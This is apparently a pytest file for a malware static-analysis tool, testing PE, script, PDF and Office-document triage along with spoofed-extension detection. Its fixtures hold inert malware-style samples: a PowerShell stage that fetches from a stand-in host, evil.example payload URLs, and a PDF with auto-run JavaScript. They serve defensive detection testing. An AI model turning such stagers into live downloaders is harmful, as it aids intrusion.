import io
import zipfile

from threat_report_agent.static_analysis import (
    derive_mechanism_facts,
    analyze_bytes,
    analyze_document,
    analyze_script,
    extract_embedded_bytes,
    fingerprint_hamming_distance,
    function_fuzzy_fingerprint,
    StaticFact,
)


def test_mechanism_derivation_builds_evidence_ready_chain_from_complementary_facts() -> None:
    facts = (
        StaticFact(
            "static_triage",
            "pe_structure",
            {
                "machine": "0x0000",
                "subsystem": 0,
                "checksum": 0,
                "imports": [
                    {
                        "module": "kernel32.dll",
                        "functions": ["FindResourceA", "LoadResource", "VirtualProtect"],
                    }
                ],
                "resources": {
                    "count": 2,
                    "rcdata_count": 2,
                    "rcdata_total_size": 128,
                    "high_entropy_count": 2,
                    "entries": [],
                },
            },
            {"type": "file_offset", "offset": 64},
        ),
        StaticFact(
            "static_triage",
            "string",
            {"text": "RtlDecompressBuffer", "encoding": "ascii"},
            {"type": "file_offset", "offset": 100},
        ),
        StaticFact(
            "static_triage",
            "string",
            {"text": "OpenSCManagerA QueryServiceStatus", "encoding": "ascii"},
            {"type": "file_offset", "offset": 140},
        ),
    )

    derived = derive_mechanism_facts(facts, subject="sample.exe")
    kinds = {item.kind for item in derived}

    assert {"resource_inventory", "mechanism_resource_payload", "mechanism_resource_extraction"} <= kinds
    assert {"mechanism_decompression", "mechanism_memory_permission", "mechanism_service_query"} <= kinds
    assert "pe_header_anomaly" in kinds


def test_mechanism_derivation_uses_function_calls_as_chain_evidence() -> None:
    derived = derive_mechanism_facts(
        (),
        subject="sample.exe",
        ghidra_output={
            "functions": [
                {
                    "name": "loader",
                    "references_from": [
                        {"target_name": "FindResourceA"},
                        {"target_name": "RtlDecompressBuffer"},
                        {"target_name": "VirtualProtect"},
                    ],
                }
            ]
        },
    )

    assert {item.kind for item in derived} >= {
        "mechanism_resource_extraction",
        "mechanism_decompression",
        "mechanism_memory_permission",
    }


def test_import_name_get_system_info_does_not_become_process_execution() -> None:
    result = analyze_bytes(
        b"MZ" + b"GetSystemInfo\x00",
        "sample.bin",
    )
    assert all(fact.kind != "execution_indicator" for fact in result.facts)


def _minimal_pe_with_export() -> bytes:
    data = bytearray(0x500)
    data[0:2] = b"MZ"
    data[0x3C:0x40] = (0x80).to_bytes(4, "little")
    data[0x80:0x84] = b"PE\x00\x00"
    data[0x84:0x86] = (0x14C).to_bytes(2, "little")
    data[0x86:0x88] = (1).to_bytes(2, "little")
    data[0x94:0x96] = (0xE0).to_bytes(2, "little")
    optional = 0x98
    data[optional : optional + 2] = (0x10B).to_bytes(2, "little")
    data[optional + 16 : optional + 20] = (0x1000).to_bytes(4, "little")
    data[optional + 92 : optional + 96] = (16).to_bytes(4, "little")
    data[optional + 96 : optional + 100] = (0x1100).to_bytes(4, "little")
    data[optional + 100 : optional + 104] = (0x80).to_bytes(4, "little")
    section = optional + 0xE0
    data[section : section + 8] = b".text\x00\x00\x00"
    data[section + 8 : section + 12] = (0x400).to_bytes(4, "little")
    data[section + 12 : section + 16] = (0x1000).to_bytes(4, "little")
    data[section + 16 : section + 20] = (0x400).to_bytes(4, "little")
    data[section + 20 : section + 24] = (0x200).to_bytes(4, "little")
    data[0x300:0x304] = (0).to_bytes(4, "little")
    data[0x304:0x308] = (0).to_bytes(4, "little")
    data[0x308:0x30C] = (1).to_bytes(4, "little")
    data[0x30C:0x310] = (0x1180).to_bytes(4, "little")
    data[0x310:0x314] = (1).to_bytes(4, "little")
    data[0x314:0x318] = (2).to_bytes(4, "little")
    data[0x318:0x31C] = (2).to_bytes(4, "little")
    data[0x31C:0x320] = (0x1190).to_bytes(4, "little")
    data[0x320:0x324] = (0x11A0).to_bytes(4, "little")
    data[0x324:0x328] = (0x11A8).to_bytes(4, "little")
    data[0x390:0x394] = (0x1000).to_bytes(4, "little")
    data[0x394:0x398] = (0x1010).to_bytes(4, "little")
    data[0x3A0:0x3A4] = (0x11B0).to_bytes(4, "little")
    data[0x3A4:0x3A8] = (0x11C0).to_bytes(4, "little")
    data[0x3A8:0x3AA] = (0).to_bytes(2, "little")
    data[0x3AA:0x3AC] = (1).to_bytes(2, "little")
    data[0x380:0x389] = b"demo.dll\x00"
    data[0x3B0:0x3B9] = b"Exported\x00"
    data[0x3C0:0x3C6] = b"Named\x00"
    data[0x400:0x401] = b"\xc3"
    return bytes(data)


def test_static_modules_create_separate_anchored_facts() -> None:
    content = (
        b"http://evil.example.com/api "
        b"VirtualAlloc WriteProcessMemory "
        b"IsDebuggerPresent vmware "
        b"CryptDecrypt AES"
    )

    result = analyze_bytes(content, "payload.bin")

    assert {fact.module for fact in result.facts} >= {
        "static_triage",
        "decryption",
        "loader",
        "c2_network",
        "anti_analysis",
    }


def test_crypto_table_candidate_is_structural_and_file_anchored() -> None:
    content = b"prefix" + bytes(range(256)) + b"suffix"
    result = analyze_bytes(content, "payload.bin")

    candidate = next(fact for fact in result.facts if fact.kind == "crypto_pattern")
    assert candidate.module == "decryption"
    assert candidate.value["algorithm"] == "RC4"
    assert candidate.anchor["type"] == "file_offset"
    assert candidate.anchor["offset"] == 6


def test_magic_mime_ignores_a_spoofed_extension() -> None:
    result = analyze_bytes(b"%PDF-1.7\n1 0 obj\n", "invoice.exe")

    assert result.detected_type == "pdf"
    assert result.summary["identity"]["mime_type"] == "application/pdf"
    assert result.summary["identity"]["type_source"] == "magic"


def test_binary_content_is_not_promoted_to_script_by_a_spoofed_extension() -> None:
    result = analyze_bytes(b"\x00\xff\x10binary", "payload.py")

    assert result.detected_type == "binary"
    assert result.summary["identity"]["mime_type"] == "application/octet-stream"
    assert result.summary["identity"]["type_source"] == "fallback"


def test_static_result_preserves_extracted_strings_as_anchored_facts() -> None:
    content = bytes.fromhex("7072656669782076697369626c652d617363696900570049004400450000")
    result = analyze_bytes(content, "sample.bin")

    strings = [fact for fact in result.facts if fact.kind == "string"]

    assert [fact.value for fact in strings] == [
        {"text": "prefix visible-ascii", "encoding": "ascii"},
        {"text": "WIDE", "encoding": "utf-16le"},
    ]
    assert [fact.anchor for fact in strings] == [
        {"type": "file_offset", "offset": 0},
        {"type": "file_offset", "offset": 21},
    ]


def test_pe_static_result_includes_exports_and_entry_anchors() -> None:
    content = bytearray(_minimal_pe_with_export())
    # IMAGE_OPTIONAL_HEADER.DllCharacteristics
    content[0x98 + 70 : 0x98 + 72] = (0x140).to_bytes(2, "little")
    result = analyze_bytes(bytes(content), "demo.dll")

    pe = result.summary["pe"]
    assert pe["exports"]["module"] == "demo.dll"
    assert pe["exports"]["names"] == ["Exported", "Named"]
    assert pe["exports"]["functions"][0]["rva"] == 0x1000
    assert pe["exports"]["functions"][0]["name"] == "Exported"
    assert pe["dll_characteristics"] == 0x140
    assert pe["dll_characteristics_flags"] == {
        "dynamic_base": True,
        "nx_compat": True,
        "no_seh": False,
        "terminal_server_aware": False,
    }


def test_python_script_extraction_has_ast_symbols_and_line_anchors() -> None:
    result = analyze_script(
        b"import base64\n\ndef decode(blob):\n    return base64.b64decode(blob)\n\nurl = 'https://example.com/a'\n",
        "dropper.py",
    )

    assert result.detected_type == "script"
    assert {item["name"] for item in result.functions} == {"decode"}
    assert list(result.imports) == ["base64"]
    assert any(item["kind"] == "call" and item["name"] == "b64decode" for item in result.calls)
    assert any(
        item["value"] == "https://example.com/a" and item["line"] == 6 for item in result.indicators
    )


def test_powershell_script_extraction_is_lexical_and_line_anchored() -> None:
    result = analyze_script(
        b"Import-Module Net.WebClient\nfunction Fetch-Stage {\n  Invoke-WebRequest('https://evil.example/x')\n}\n",
        "stage.ps1",
    )

    assert result.language == "powershell"
    assert result.functions[0] == {"name": "Fetch-Stage", "line": 2}
    assert result.calls[0]["name"] == "Invoke-WebRequest"
    assert result.indicators[0]["line"] == 3


def test_renamed_utf16_powershell_is_detected_from_content() -> None:
    content = (
        "Import-Module Net.WebClient\n"
        "function Fetch-Stage {\n"
        "  Invoke-WebRequest('https://evil.example/x')\n"
        "}\n"
    ).encode("utf-16")

    result = analyze_bytes(content, "invoice.dat")

    assert result.detected_type == "script"
    function = next(fact for fact in result.facts if fact.kind == "script_function")
    assert function.value["name"] == "Fetch-Stage"
    assert function.anchor == {"type": "script_line", "line": 2}


def test_static_result_exposes_script_facts_with_script_line_anchors() -> None:
    result = analyze_bytes(b"def stage():\n  return 1\n", "stage.py")

    fact = next(item for item in result.facts if item.kind == "script_function")
    assert fact.value["name"] == "stage"
    assert fact.anchor == {"type": "script_line", "line": 1}


def test_pdf_carrier_extraction_has_pages_urls_and_action_anchors() -> None:
    content = (
        b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /OpenAction 2 0 R /Title (Invoice) >>\nendobj\n"
        b"2 0 obj\n<< /S /JavaScript /JS (app.alert) /URI (https://evil.example/x) >>\nendobj\n"
        b"3 0 obj\n<< /Type /Page >>\nendobj\n"
    )

    result = analyze_document(content, "invoice.pdf")

    assert result.detected_type == "pdf"
    assert result.summary["page_count"] == 1
    assert result.summary["metadata"]["Title"] == "Invoice"
    assert result.javascript[0]["anchor"]["type"] == "pdf_object"
    assert result.urls[0]["value"] == "https://evil.example/x"


def test_ooxml_carrier_extraction_exposes_relationships_macros_and_embedded_paths() -> None:
    content = io.BytesIO()
    with zipfile.ZipFile(content, "w") as archive:
        archive.writestr("[Content_Types].xml", b"<Types />")
        archive.writestr("word/vbaProject.bin", b"macro")
        archive.writestr("word/embeddings/oleObject1.bin", b"embedded")
        archive.writestr(
            "word/_rels/document.xml.rels",
            b'<Relationships><Relationship Target="https://evil.example/payload" TargetMode="External" /></Relationships>',
        )

    result = analyze_document(content.getvalue(), "invoice.docm")

    assert result.detected_type == "ooxml"
    assert result.summary["has_vba"] is True
    assert result.embedded_objects[0]["internal_path"] == "word/embeddings/oleObject1.bin"
    assert result.urls[0]["value"] == "https://evil.example/payload"


def test_ooxml_content_is_not_downgraded_when_renamed_as_a_zip() -> None:
    content = io.BytesIO()
    with zipfile.ZipFile(content, "w") as archive:
        archive.writestr("[Content_Types].xml", b"<Types />")
        archive.writestr("word/document.xml", b"<w:document />")

    result = analyze_bytes(content.getvalue(), "invoice.zip")

    assert result.detected_type == "ooxml"
    assert result.summary["identity"]["type_source"] == "magic_and_container"


def test_plain_zip_is_not_promoted_to_ooxml_by_a_spoofed_extension() -> None:
    content = io.BytesIO()
    with zipfile.ZipFile(content, "w") as archive:
        archive.writestr("payload.bin", b"not an OOXML package")

    result = analyze_bytes(content.getvalue(), "invoice.docx")

    assert result.detected_type == "zip"
    assert result.summary["identity"]["mime_type"] == "application/zip"
    assert result.summary["identity"]["type_source"] == "magic"


def test_script_imports_and_calls_are_anchored_static_facts() -> None:
    result = analyze_bytes(
        b"import socket\n\ndef stage():\n    return socket.create_connection(('x', 1))\n",
        "stage.py",
    )

    imported = next(fact for fact in result.facts if fact.kind == "script_import")
    called = next(fact for fact in result.facts if fact.kind == "script_call")
    assert imported.value["name"] == "socket"
    assert imported.anchor == {"type": "script_line", "line": 1}
    assert called.value["name"] == "create_connection"
    assert called.anchor == {"type": "script_line", "line": 4}


def test_static_result_exposes_document_urls_as_anchored_facts() -> None:
    result = analyze_bytes(b"%PDF-1.7\n1 0 obj << /URI (https://evil.example/x) >>", "lure.pdf")

    fact = next(item for item in result.facts if item.kind == "document_url")
    assert fact.module == "c2_network"
    assert fact.anchor["type"] == "pdf_object"


def test_pdf_embedded_attachment_bytes_are_materialized_safely() -> None:
    from pypdf import PdfWriter

    writer = PdfWriter()
    writer.add_blank_page(width=72, height=72)
    writer.add_attachment("payload.txt", b"static child payload")
    output = io.BytesIO()
    writer.write(output)

    extracted = extract_embedded_bytes(output.getvalue(), "carrier.pdf")
    assert extracted
    assert extracted[0]["kind"] == "pdf_embedded_file"
    assert extracted[0]["content"] == b"static child payload"


def test_function_simhash_groups_similar_instruction_sequences() -> None:
    similar_a = function_fuzzy_fingerprint(["push", "mov", "call", "add", "ret"])
    similar_b = function_fuzzy_fingerprint(["push", "mov", "call", "sub", "ret"])
    unrelated = function_fuzzy_fingerprint(["xor", "jmp", "cmp", "jne", "nop"])

    assert fingerprint_hamming_distance(similar_a, similar_b) < fingerprint_hamming_distance(
        similar_a, unrelated
    )


def test_function_simhash_uses_the_finished_mnemonic_4gram_contract() -> None:
    fingerprint = function_fuzzy_fingerprint(["push", "mov", "call", "add", "ret"])

    assert fingerprint == "6012110018090100"


def test_invalid_ole_carrier_is_reported_as_a_limit_not_executed() -> None:
    result = analyze_document(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64, "legacy.doc")

    assert result.detected_type == "ole"
    assert result.limitations == ("Invalid OLE compound file.",)
